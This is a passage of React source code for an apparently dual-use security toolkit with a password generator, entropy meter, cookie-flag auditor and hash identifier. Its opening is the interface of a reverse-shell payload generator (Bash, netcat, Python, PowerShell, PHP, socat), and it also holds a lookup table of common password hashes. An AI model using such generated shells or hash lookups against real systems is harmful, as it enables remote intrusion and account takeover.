                <label className="block text-xs font-mono text-mist mb-1">Target Listener Port (LPORT):</label>
                <input
                  type="text"
                  placeholder="4444"
                  value={shellPort}
                  onChange={(e) => setShellPort(e.target.value)}
                  className="w-full bg-void border border-panelBorder rounded-xl px-4 py-2.5 text-xs font-mono text-white focus:outline-none focus:border-cyan-signal/60 transition"
                />
              </div>
            </div>

            <div className="flex gap-1.5 flex-wrap text-xs font-mono">
              {([
                { key: "bash",       label: "Bash TCP" },
                { key: "bash_b64",   label: "Bash (Base64)" },
                { key: "nc_mkfifo",  label: "Netcat (mkfifo)" },
                { key: "python",     label: "Python3" },
                { key: "powershell", label: "PowerShell" },
                { key: "php",        label: "PHP Exec" },
                { key: "socat",      label: "Socat" },
              ] as const).map((s) => (
                <button
                  key={s.key}
                  onClick={() => setShellType(s.key)}
                  className={`px-3 py-1 rounded-lg border transition ${
                    shellType === s.key
                      ? "bg-cyan-signal/20 text-cyan-signal border-cyan-signal/50 font-bold"
                      : "bg-void border-panelBorder text-mist hover:text-white"
                  }`}
                >
                  {s.label}
                </button>
              ))}
            </div>

            <div className="bg-void/90 border border-panelBorder/70 rounded-xl p-4 space-y-2 animate-slideUp">
              <div className="flex items-center justify-between">
                <span className="text-[10px] font-mono text-cyan-signal uppercase tracking-widest font-bold">
                  PAYLOAD COMMAND
                </span>
                <button
                  onClick={() => copyToClipboard(getShellPayload(), "shell_payload")}
                  className="px-3 py-1 bg-cyan-signal text-void text-xs font-mono font-bold rounded-lg hover:opacity-90 transition"
                >
                  {copiedKey === "shell_payload" ? "COPIED ✓" : "COPY PAYLOAD"}
                </button>
              </div>
              <pre className="text-xs font-mono text-emerald-400 bg-panel/70 p-3 rounded-lg border border-panelBorder overflow-x-auto whitespace-pre-wrap select-all">
                {getShellPayload()}
              </pre>
            </div>
          </div>
        )}

        {/* 6. PASSWORD ENTROPY & STRENGTH */}
        {activeTool === "entropy" && (
          <div className="space-y-4 pt-2">
            <div>
              <label className="block text-xs font-mono text-mist mb-1.5">Enter Password or Secret to Measure:</label>
              <input
                type="text"
                placeholder="Type password string here..."
                value={pwInput}
                onChange={(e) => setPwInput(e.target.value)}
                className="w-full bg-void border border-panelBorder rounded-xl px-4 py-3 text-sm font-mono text-white placeholder:text-mist/30 focus:outline-none focus:border-cyan-signal/60 transition"
              />
            </div>

            {entropyResult && (
              <div className="space-y-3 font-mono text-xs animate-slideUp">
                <div className="bg-void/70 p-4 rounded-xl border border-panelBorder/60 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
                  <div>
                    <span className="text-[10px] text-mist uppercase tracking-widest block font-bold">STRENGTH LEVEL</span>
                    <span className="text-base font-bold text-white mt-0.5 block">{entropyResult.strength}</span>
                  </div>
                  <div className="text-right">
                    <span className="text-[10px] text-mist uppercase tracking-widest block font-bold">SHANNON ENTROPY</span>
                    <span className="text-lg font-bold text-cyan-signal">{entropyResult.entropy} bits</span>
                  </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                  <div className="bg-void/70 p-3 rounded-xl border border-panelBorder/60">
                    <span className="text-[10px] text-mist uppercase tracking-widest block">Length</span>
                    <span className="text-white font-bold">{entropyResult.length} chars</span>
                  </div>
                  <div className="bg-void/70 p-3 rounded-xl border border-panelBorder/60">
                    <span className="text-[10px] text-mist uppercase tracking-widest block">Character Pool</span>
                    <span className="text-white font-bold">{entropyResult.poolSize} variations</span>
                  </div>
                  <div className="bg-void/70 p-3 rounded-xl border border-panelBorder/60">
                    <span className="text-[10px] text-mist uppercase tracking-widest block">GPU Crack Time</span>
                    <span className="text-white font-bold">{entropyResult.crackTime}</span>
                  </div>
                </div>

                <div className="flex gap-2 flex-wrap text-[11px]">
                  <span className={`px-2.5 py-1 rounded border ${entropyResult.hasLower ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/30" : "bg-panel text-mist/40 border-panelBorder"}`}>
                    a-z Lowercase {entropyResult.hasLower ? "✓" : "✗"}
                  </span>
                  <span className={`px-2.5 py-1 rounded border ${entropyResult.hasUpper ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/30" : "bg-panel text-mist/40 border-panelBorder"}`}>
                    A-Z Uppercase {entropyResult.hasUpper ? "✓" : "✗"}
                  </span>
                  <span className={`px-2.5 py-1 rounded border ${entropyResult.hasNumber ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/30" : "bg-panel text-mist/40 border-panelBorder"}`}>
                    0-9 Numbers {entropyResult.hasNumber ? "✓" : "✗"}
                  </span>
                  <span className={`px-2.5 py-1 rounded border ${entropyResult.hasSymbol ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/30" : "bg-panel text-mist/40 border-panelBorder"}`}>
                    !@# Symbols {entropyResult.hasSymbol ? "✓" : "✗"}
                  </span>
                </div>
              </div>
            )}
          </div>
        )}

        {/* 7. PASSWORD GENERATOR */}
        {activeTool === "passgen" && (
          <PasswordGenerator copyToClipboard={copyToClipboard} copiedKey={copiedKey} />
        )}

        {/* 8. COOKIE SECURITY AUDITOR */}
        {activeTool === "cookie" && (
          <CookieAuditor copyToClipboard={copyToClipboard} copiedKey={copiedKey} />
        )}

        {/* 9. HASH IDENTIFIER & RAINBOW LOOKUP */}
        {activeTool === "hashlookup" && (
          <HashLookup copyToClipboard={copyToClipboard} copiedKey={copiedKey} />
        )}
      </div>
    </div>
  );
}

// ---------------------------------------------------------------------------
// Password Generator Sub-component
// ---------------------------------------------------------------------------

const ADJECTIVES = ["crimson","silver","phantom","azure","cosmic","frozen","brave","silent","rapid","solar","lunar","neon","vast","jade","storm","echo"];
const NOUNS = ["falcon","cipher","nexus","vortex","prism","shield","anchor","forge","orbit","bastion","matrix","ember","quasar","delta","proxy","ghost"];
const VERBS = ["strike","bypass","encode","detect","patch","secure","trace","forge","invoke","deploy","scan","vault","pivot","relay","probe","breach"];

function generatePassphrase(wordCount: number): string {
  const pick = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
  const parts = [];
  for (let i = 0; i < wordCount; i++) {
    const pool = [ADJECTIVES, NOUNS, VERBS];
    parts.push(pick(pool[i % 3]));
  }
  return parts.join("-");
}

function generatePassword(length: number, opts: { lower: boolean; upper: boolean; digits: boolean; symbols: boolean; ambiguous: boolean }): string {
  let charset = "";
  if (opts.lower) charset += opts.ambiguous ? "abcdefghijklmnopqrstuvwxyz" : "abcdefghjkmnpqrstuvwxyz";
  if (opts.upper) charset += opts.ambiguous ? "ABCDEFGHIJKLMNOPQRSTUVWXYZ" : "ABCDEFGHJKMNPQRSTUVWXYZ";
  if (opts.digits) charset += opts.ambiguous ? "0123456789" : "23456789";
  if (opts.symbols) charset += "!@#$%^&*()-_=+[]{}|;:,.<>?";
  if (!charset) charset = "abcdefghijklmnopqrstuvwxyz";
  const arr = new Uint32Array(length);
  crypto.getRandomValues(arr);
  return Array.from(arr, v => charset[v % charset.length]).join("");
}

function computeEntropy2(pw: string): number {
  let pool = 0;
  if (/[a-z]/.test(pw)) pool += 26;
  if (/[A-Z]/.test(pw)) pool += 26;
  if (/[0-9]/.test(pw)) pool += 10;
  if (/[^a-zA-Z0-9]/.test(pw)) pool += 33;
  if (pool === 0) pool = 26;
  return Math.round(pw.length * Math.log2(pool));
}

function PasswordGenerator({ copyToClipboard, copiedKey }: { copyToClipboard: (text: string, key: string) => void; copiedKey: string | null }) {
  const [mode, setMode] = useState<"random" | "passphrase">("random");
  const [length, setLength] = useState(20);
  const [wordCount, setWordCount] = useState(4);
  const [opts, setOpts] = useState({ lower: true, upper: true, digits: true, symbols: true, ambiguous: true });
  const [password, setPassword] = useState("");
  const [history, setHistory] = useState<string[]>([]);
  const [hibpStatus, setHibpStatus] = useState<"idle" | "loading" | "safe" | "breached">("idle");
  const [hibpCount, setHibpCount] = useState(0);

  const generate = () => {
    const pw = mode === "random" ? generatePassword(length, opts) : generatePassphrase(wordCount);
    setPassword(pw);
    setHistory(prev => [pw, ...prev.slice(0, 9)]);
    setHibpStatus("idle");
  };

  const checkHIBP = async () => {
    if (!password) return;
    setHibpStatus("loading");
    try {
      const msgBuffer = new TextEncoder().encode(password);
      const hashBuffer = await crypto.subtle.digest("SHA-1", msgBuffer);
      const hashHex = Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, "0")).join("").toUpperCase();
      const prefix = hashHex.slice(0, 5);
      const suffix = hashHex.slice(5);
      const res = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`, {
        headers: { "Add-Padding": "true" },
      });
      const text = await res.text();
      const lines = text.split("\n");
      const match = lines.find(l => l.startsWith(suffix));
      if (match) {
        const count = parseInt(match.split(":")[1] || "0");
        setHibpCount(count);
        setHibpStatus("breached");
      } else {
        setHibpStatus("safe");
      }
    } catch {
      setHibpStatus("idle");
    }
  };

  const entropy = password ? computeEntropy2(password) : 0;
  const strengthLabel = entropy > 80 ? "Military / Vault Grade" : entropy > 60 ? "Strong" : entropy > 45 ? "Moderate" : "Weak";
  const strengthColor = entropy > 80 ? "bg-emerald-400" : entropy > 60 ? "bg-cyan-400" : entropy > 45 ? "bg-amber-400" : "bg-red-400";
  const strengthPct = Math.min(100, (entropy / 100) * 100);

  return (
    <div className="space-y-5 pt-2">
      {/* Mode Toggle */}
      <div className="flex gap-2">
        {(["random", "passphrase"] as const).map(m => (
          <button key={m} onClick={() => setMode(m)}
            className={`px-4 py-2 rounded-xl text-xs font-mono font-semibold border transition ${
              mode === m ? "bg-cyan-signal text-void border-cyan-signal" : "bg-void border-panelBorder text-mist hover:text-white"
            }`}>
            {m === "random" ? "🎲 Random Password" : "📖 Passphrase"}
          </button>
        ))}
      </div>

      {mode === "random" ? (
        <div className="space-y-4">
          {/* Length */}
          <div className="space-y-2">
            <div className="flex justify-between">
              <label className="text-xs font-mono text-mist">Length</label>
              <span className="text-xs font-mono text-cyan-signal font-bold">{length} characters</span>
            </div>
            <input type="range" min={8} max={128} value={length} onChange={e => setLength(Number(e.target.value))}
              className="w-full accent-cyan-500" />
          </div>
          {/* Charset options */}
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
            {([
              { key: "lower", label: "a–z Lowercase" },
              { key: "upper", label: "A–Z Uppercase" },
              { key: "digits", label: "0–9 Digits" },
              { key: "symbols", label: "!@# Symbols" },
              { key: "ambiguous", label: "Include Ambiguous (0,O,l,I)" },
            ] as const).map(o => (
              <label key={o.key} className="flex items-center gap-2 cursor-pointer group">
                <div onClick={() => setOpts(prev => ({ ...prev, [o.key]: !prev[o.key] }))}
                  className={`w-4 h-4 rounded border flex items-center justify-center transition cursor-pointer shrink-0 ${
                    opts[o.key] ? "bg-cyan-signal border-cyan-signal" : "border-panelBorder group-hover:border-cyan-signal/50"
                  }`}>
                  {opts[o.key] && <span className="text-void text-[10px] font-bold">✓</span>}
                </div>
                <span onClick={() => setOpts(prev => ({ ...prev, [o.key]: !prev[o.key] }))}
                  className="text-xs font-mono text-mist group-hover:text-white transition">{o.label}</span>
              </label>
            ))}
          </div>
        </div>
      ) : (
        <div className="space-y-2">
          <div className="flex justify-between">
            <label className="text-xs font-mono text-mist">Word Count</label>
            <span className="text-xs font-mono text-cyan-signal font-bold">{wordCount} words</span>
          </div>
          <input type="range" min={3} max={8} value={wordCount} onChange={e => setWordCount(Number(e.target.value))}
            className="w-full accent-cyan-500" />
          <p className="text-[11px] font-mono text-mist/60">Generates memorable passphrases like: {generatePassphrase(wordCount)}</p>
        </div>
      )}

      {/* Generate Button */}
      <button onClick={generate}
        className="w-full py-3 bg-cyan-signal text-void rounded-xl font-display font-bold text-sm hover:opacity-90 transition">
        🎲 Generate {mode === "random" ? "Password" : "Passphrase"}
      </button>

      {/* Output */}
      {password && (
        <div className="space-y-3 animate-slideUp">
          <div className="bg-void/90 border border-cyan-signal/30 rounded-xl p-4 space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-mono text-cyan-signal uppercase tracking-widest font-bold">GENERATED</span>
              <div className="flex gap-2">
                <button onClick={checkHIBP}
                  className="px-2.5 py-1 text-[10px] font-mono border border-violet-500/40 text-violet-300 hover:bg-violet-500/10 rounded transition">
                  {hibpStatus === "loading" ? "Checking..." : "🔍 HIBP Check"}
                </button>
                <button onClick={() => copyToClipboard(password, "passgen_out")}
                  className="px-2.5 py-1 text-[10px] font-mono border border-panelBorder text-cyan-signal hover:bg-cyan-signal/10 rounded transition">
                  {copiedKey === "passgen_out" ? "COPIED ✓" : "COPY"}
                </button>
              </div>
            </div>
            <div className="font-mono text-sm text-white break-all select-all bg-panel/60 p-3 rounded-lg border border-panelBorder tracking-wider">
              {password}
            </div>

            {/* Entropy Bar */}
            <div className="space-y-1.5">
              <div className="flex justify-between text-[11px] font-mono">
                <span className="text-mist">{strengthLabel}</span>
                <span className="text-cyan-signal font-bold">{entropy} bits entropy</span>
              </div>
              <div className="w-full h-2 bg-void rounded-full overflow-hidden">
                <div className={`h-full rounded-full transition-all duration-500 ${strengthColor}`}
                  style={{ width: `${strengthPct}%` }} />
              </div>
            </div>

            {/* HIBP Result */}
            {hibpStatus === "safe" && (
              <div className="p-2.5 bg-emerald-500/10 border border-emerald-500/30 rounded-xl font-mono text-xs text-emerald-400 flex items-center gap-2">
                ✅ Not found in any known data breach (HIBP k-Anonymity check)
              </div>
            )}
            {hibpStatus === "breached" && (
              <div className="p-2.5 bg-red-500/10 border border-red-500/30 rounded-xl font-mono text-xs text-red-400 flex items-center gap-2">
                ⚠️ Found in <span className="font-bold">{hibpCount.toLocaleString()}</span> breach records — do NOT use this password!
              </div>
            )}
          </div>

          {/* History */}
          {history.length > 1 && (
            <div className="space-y-2">
              <div className="text-[10px] font-mono text-mist uppercase tracking-wider font-bold">Recent Generated</div>
              <div className="space-y-1 max-h-40 overflow-y-auto">
                {history.slice(1).map((pw, i) => (
                  <div key={i} className="flex items-center justify-between bg-void/50 px-3 py-2 rounded-lg border border-panelBorder/50 font-mono text-xs gap-2">
                    <span className="text-mist/70 break-all">{pw}</span>
                    <button onClick={() => copyToClipboard(pw, `hist_${i}`)}
                      className="text-[10px] text-mist hover:text-cyan-signal shrink-0 transition">
                      {copiedKey === `hist_${i}` ? "✓" : "copy"}
                    </button>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// ---------------------------------------------------------------------------
// Cookie Security Auditor Sub-component
// ---------------------------------------------------------------------------

interface ParsedCookie {
  name: string;
  value: string;
  domain: string | null;
  path: string | null;
  expires: string | null;
  maxAge: string | null;
  sameSite: "Strict" | "Lax" | "None" | "Missing";
  secure: boolean;
  httpOnly: boolean;
  partitioned: boolean;
  hasHostPrefix: boolean;
  hasSecurePrefix: boolean;
  issues: string[];
  score: number;
  grade: "A" | "B" | "C" | "D" | "F";
}

function parseSetCookie(raw: string): ParsedCookie | null {
  if (!raw.trim()) return null;
  const parts = raw.trim().split(";").map(p => p.trim());
  if (!parts.length || !parts[0].includes("=")) return null;

  const [name, ...valParts] = parts[0].split("=");
  const value = valParts.join("=");
  let domain: string | null = null;
  let path: string | null = null;
  let expires: string | null = null;
  let maxAge: string | null = null;
  let sameSite: "Strict" | "Lax" | "None" | "Missing" = "Missing";
  let secure = false;
  let httpOnly = false;
  let partitioned = false;

  for (let i = 1; i < parts.length; i++) {
    const attr = parts[i];
    const attrLower = attr.toLowerCase();
    if (attrLower === "secure") secure = true;
    else if (attrLower === "httponly") httpOnly = true;
    else if (attrLower === "partitioned") partitioned = true;
    else if (attrLower.startsWith("domain=")) domain = attr.slice(7);
    else if (attrLower.startsWith("path=")) path = attr.slice(5);
    else if (attrLower.startsWith("expires=")) expires = attr.slice(8);
    else if (attrLower.startsWith("max-age=")) maxAge = attr.slice(8);
    else if (attrLower.startsWith("samesite=")) {
      const ss = attr.slice(9).toLowerCase();
      if (ss === "strict") sameSite = "Strict";
      else if (ss === "lax") sameSite = "Lax";
      else if (ss === "none") sameSite = "None";
    }
  }

  const hasHostPrefix = name.startsWith("__Host-");
  const hasSecurePrefix = name.startsWith("__Secure-");

  let score = 100;
  const issues: string[] = [];

  if (!httpOnly) {
    score -= 30;
    issues.push("CWE-1004: Missing 'HttpOnly' flag — vulnerable to session theft via Cross-Site Scripting (XSS).");
  }
  if (!secure) {
    score -= 35;
    issues.push("CWE-614: Missing 'Secure' flag — transmitted over cleartext HTTP; prone to Man-in-the-Middle interception.");
  }
  if (sameSite === "Missing") {
    score -= 20;
    issues.push("CWE-1275: Missing 'SameSite' attribute — browser defaults to Lax, but explicit enforcement is recommended.");
  } else if (sameSite === "None" && !secure) {
    score -= 25;
    issues.push("SameSite=None without Secure flag will be rejected by modern browsers and is susceptible to CSRF.");
  }

  if (domain && domain.startsWith(".")) {
    score -= 10;
    issues.push("Loose domain attribute (wildcard subdomain scope) expands attack surface to rogue subdomains.");
  }

  if (hasHostPrefix && (!secure || path !== "/" || domain !== null)) {
    issues.push("__Host- cookie violation: Requires Secure=true, Path=/, and NO Domain attribute.");
  }

  score = Math.max(0, score);
  let grade: "A" | "B" | "C" | "D" | "F" = "F";
  if (score >= 90) grade = "A";
  else if (score >= 75) grade = "B";
  else if (score >= 60) grade = "C";
  else if (score >= 40) grade = "D";

  return {
    name,
    value,
    domain,
    path,
    expires,
    maxAge,
    sameSite,
    secure,
    httpOnly,
    partitioned,
    hasHostPrefix,
    hasSecurePrefix,
    issues,
    score,
    grade,
  };
}

function CookieAuditor({ copyToClipboard, copiedKey }: { copyToClipboard: (text: string, key: string) => void; copiedKey: string | null }) {
  const [cookieInput, setCookieInput] = useState("sessionid=9f8a2c4e61b; Path=/; Secure; HttpOnly; SameSite=Lax");
  const parsed = parseSetCookie(cookieInput);

  return (
    <div className="space-y-4 pt-2 font-mono">
      <div>
        <label className="text-[10px] text-mist uppercase tracking-widest font-bold block mb-1">
          Paste Set-Cookie Header or Raw Cookie String
        </label>
        <textarea
          rows={3}
          value={cookieInput}
          onChange={(e) => setCookieInput(e.target.value)}
          placeholder="Set-Cookie: session_id=xyz; Path=/; Secure; HttpOnly; SameSite=Strict"
          className="w-full px-4 py-3 bg-void border border-panelBorder rounded-xl text-white font-mono text-xs focus:outline-none focus:border-cyan-signal/60 resize-none"
        />
      </div>

      {parsed && (
        <div className="space-y-4 animate-slideUp">
          {/* Executive Rating Card */}
          <div className="p-4 bg-void/80 border border-panelBorder rounded-xl flex flex-col sm:flex-row sm:items-center justify-between gap-4">
            <div>
              <div className="text-[10px] text-mist uppercase font-bold">Cookie Security Score</div>
              <div className="text-2xl font-bold text-white flex items-center gap-3 mt-1 font-display">
                <span className={`px-3 py-0.5 rounded-lg border text-sm font-mono font-bold ${
                  parsed.grade === "A" ? "bg-emerald-500/20 text-emerald-400 border-emerald-500/40" :
                  parsed.grade === "B" ? "bg-cyan-500/20 text-cyan-400 border-cyan-500/40" :
                  parsed.grade === "C" ? "bg-amber-500/20 text-amber-400 border-amber-500/40" :
                  "bg-rose-500/20 text-rose-400 border-rose-500/40"
                }`}>
                  Grade {parsed.grade} ({parsed.score}/100)
                </span>
                <span className="text-sm font-sans text-mist truncate">Cookie: {parsed.name}</span>
              </div>
            </div>

            {/* Flag Badges Grid */}
            <div className="flex flex-wrap gap-2">
              <span className={`px-2.5 py-1 rounded text-xs border ${parsed.httpOnly ? "bg-emerald-500/20 text-emerald-400 border-emerald-500/30" : "bg-rose-500/20 text-rose-400 border-rose-500/30 font-bold"}`}>
                HttpOnly {parsed.httpOnly ? "✓" : "MISSING ⚠️"}
              </span>
              <span className={`px-2.5 py-1 rounded text-xs border ${parsed.secure ? "bg-emerald-500/20 text-emerald-400 border-emerald-500/30" : "bg-rose-500/20 text-rose-400 border-rose-500/30 font-bold"}`}>
                Secure {parsed.secure ? "✓" : "MISSING ⚠️"}
              </span>
              <span className={`px-2.5 py-1 rounded text-xs border ${parsed.sameSite !== "Missing" ? "bg-emerald-500/20 text-emerald-400 border-emerald-500/30" : "bg-amber-500/20 text-amber-400 border-amber-500/30"}`}>
                SameSite: {parsed.sameSite}
              </span>
            </div>
          </div>

          {/* Details Table */}
          <div className="bg-void/60 border border-panelBorder/70 rounded-xl p-4 space-y-2 text-xs">
            <div className="text-[10px] text-cyan-signal uppercase tracking-widest font-bold mb-2">Attributes Breakdown</div>
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-mist">
              <div>
                <span className="text-[10px] text-mist/60 block">NAME</span>
                <span className="text-white font-bold">{parsed.name}</span>
              </div>
              <div>
                <span className="text-[10px] text-mist/60 block">PATH</span>
                <span className="text-white font-bold">{parsed.path || "/ (Default)"}</span>
              </div>
              <div>
                <span className="text-[10px] text-mist/60 block">DOMAIN</span>
                <span className="text-white font-bold">{parsed.domain || "Host-only"}</span>
              </div>
              <div>
                <span className="text-[10px] text-mist/60 block">MAX-AGE / EXPIRY</span>
                <span className="text-white font-bold">{parsed.maxAge ? `${parsed.maxAge}s` : parsed.expires || "Session"}</span>
              </div>
            </div>
          </div>

          {/* Issues List */}
          {parsed.issues.length > 0 && (
            <div className="p-3.5 bg-rose-500/10 border border-rose-500/20 rounded-xl space-y-1.5">
              <div className="text-xs font-bold text-rose-400">Security Audit Warnings:</div>
              {parsed.issues.map((iss, idx) => (
                <div key={idx} className="text-xs text-rose-300/90 flex items-start gap-2">
                  <span>⚠️</span>
                  <span>{iss}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// ---------------------------------------------------------------------------
// Hash Identifier & Rainbow Table Sub-component
// ---------------------------------------------------------------------------

const COMMON_HASHES: Record<string, { plain: string; type: string }> = {
  // MD5
  "5f4dcc3b5aa765d61d8327deb882cf99": { plain: "password", type: "MD5" },
  "21232f297a57a5a743894a0e4a801fc3": { plain: "admin", type: "MD5" },
  "e10adc3949ba59abbe56e057f20f883e": { plain: "123456", type: "MD5" },
  "d8578edf8458ce06fbc5bb76a58c5ca4": { plain: "qwerty", type: "MD5" },
  "63a9f0ea7bb98050796b649e85481845": { plain: "root", type: "MD5" },
  "098f6bcd4621d373cade4e832627b4f6": { plain: "test", type: "MD5" },
  "fcea920f7412b4da7be0cf6f11c62686": { plain: "guest", type: "MD5" },
  // SHA1
  "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8": { plain: "password", type: "SHA-1" },
  "d033e22ae348aeb5660fc2140aec35850c4da997": { plain: "admin", type: "SHA-1" },
  "7c4a8d09ca3762af61e59520943dc26494f8941b": { plain: "123456", type: "SHA-1" },
  // SHA256
  "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8": { plain: "password", type: "SHA-256" },
  "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918": { plain: "admin", type: "SHA-256" },
  "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855": { plain: "(empty string)", type: "SHA-256" },
};

function identifyHash(h: string): { likelyTypes: string[]; bits: number; charset: string } {
  const clean = h.trim().toLowerCase();
  const len = clean.length;
  const isHex = /^[0-9a-f]+$/i.test(clean);

  if (!isHex) {
    if (clean.startsWith("$2a$") || clean.startsWith("$2b$") || clean.startsWith("$2y$")) {
      return { likelyTypes: ["bcrypt"], bits: 184, charset: "Base64 (Crypt format)" };
    }
    if (clean.startsWith("$argon2")) {
      return { likelyTypes: ["Argon2 (id/i/d)"], bits: 256, charset: "Argon2 format" };
    }
    return { likelyTypes: ["Unknown / Non-Hex encoding"], bits: len * 8, charset: "Custom" };
  }

  switch (len) {
    case 32:
      return { likelyTypes: ["MD5", "NTLM", "MD4", "MD2"], bits: 128, charset: "Hexadecimal" };
    case 40:
      return { likelyTypes: ["SHA-1", "RIPEMD-160", "MySQL 4.1+"], bits: 160, charset: "Hexadecimal" };
    case 56:
      return { likelyTypes: ["SHA-224", "SHA3-224"], bits: 224, charset: "Hexadecimal" };
    case 64:
      return { likelyTypes: ["SHA-256", "SHA3-256", "BLAKE2s", "HMAC-SHA256"], bits: 256, charset: "Hexadecimal" };
    case 96:
      return { likelyTypes: ["SHA-384", "SHA3-384"], bits: 384, charset: "Hexadecimal" };
    case 128:
      return { likelyTypes: ["SHA-512", "SHA3-512", "BLAKE2b", "Whirlpool"], bits: 512, charset: "Hexadecimal" };
    default:
      return { likelyTypes: ["Custom / Unknown Hash Length"], bits: len * 4, charset: "Hexadecimal" };
  }
}

function HashLookup({ copyToClipboard, copiedKey }: { copyToClipboard: (text: string, key: string) => void; copiedKey: string | null }) {
  const [hashInput, setHashInput] = useState("5f4dcc3b5aa765d61d8327deb882cf99");
  const clean = hashInput.trim().toLowerCase();
  const identity = identifyHash(clean);
  const matched = COMMON_HASHES[clean];

  return (
    <div className="space-y-4 pt-2 font-mono">
      <div>
        <label className="text-[10px] text-mist uppercase tracking-widest font-bold block mb-1">
          Input Hash (MD5, SHA-1, SHA-256, SHA-512, NTLM, bcrypt)
        </label>
        <div className="relative">
          <input
            type="text"
            value={hashInput}
            onChange={(e) => setHashInput(e.target.value)}
            placeholder="Paste hash e.g. 5f4dcc3b5aa765d61d8327deb882cf99"
            className="w-full px-4 py-3 bg-void border border-panelBorder rounded-xl text-white font-mono text-xs focus:outline-none focus:border-cyan-signal/60"
          />
        </div>
      </div>

      {clean && (
        <div className="space-y-4 animate-slideUp">
          {/* Identity & Match Banner */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {/* Algorithm Recognition */}
            <div className="p-4 bg-void/80 border border-panelBorder rounded-xl space-y-3">
              <div className="text-[10px] text-cyan-signal uppercase tracking-widest font-bold">
                Algorithm Identification
              </div>
              <div className="flex flex-wrap gap-1.5">
                {identity.likelyTypes.map((t, idx) => (
                  <span key={idx} className="px-2.5 py-1 rounded bg-panel border border-panelBorder text-xs text-white font-bold">
                    {t}
                  </span>
                ))}
              </div>
              <div className="text-xs text-mist pt-1 border-t border-panelBorder/40 flex justify-between">
                <span>Bit Length: {identity.bits} bits</span>
                <span>Charset: {identity.charset}</span>
              </div>
            </div>

            {/* Rainbow Table Result */}
            <div className={`p-4 rounded-xl border ${matched ? "bg-emerald-500/10 border-emerald-500/30" : "bg-void/80 border-panelBorder"}`}>
              <div className="text-[10px] uppercase tracking-widest font-bold text-mist mb-1">
                Rainbow Dictionary Lookup
              </div>
              {matched ? (
                <div className="space-y-2">
                  <div className="text-xs text-emerald-400 font-bold flex items-center gap-1.5">
                    <span>✅</span> CRACKED / PLAINTEXT IDENTIFIED:
                  </div>
                  <div className="p-2.5 bg-void border border-emerald-500/40 rounded-lg text-sm font-bold text-white break-all flex items-center justify-between">
                    <span>{matched.plain}</span>
                    <button
                      onClick={() => copyToClipboard(matched.plain, "cracked_hash")}
                      className="text-[10px] px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 hover:bg-emerald-500/30 transition"
                    >
                      {copiedKey === "cracked_hash" ? "✓" : "COPY"}
                    </button>
                  </div>
                </div>
              ) : (
                <div className="text-xs text-mist/70 pt-1 space-y-1">
                  <div>Not in local top-dictionary.</div>
                  <div className="text-[11px] text-cyan-signal/80 pt-1">
                    Tip: For complex salted hashes, verify via Hashcat or John The Ripper with wordlist rules.
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
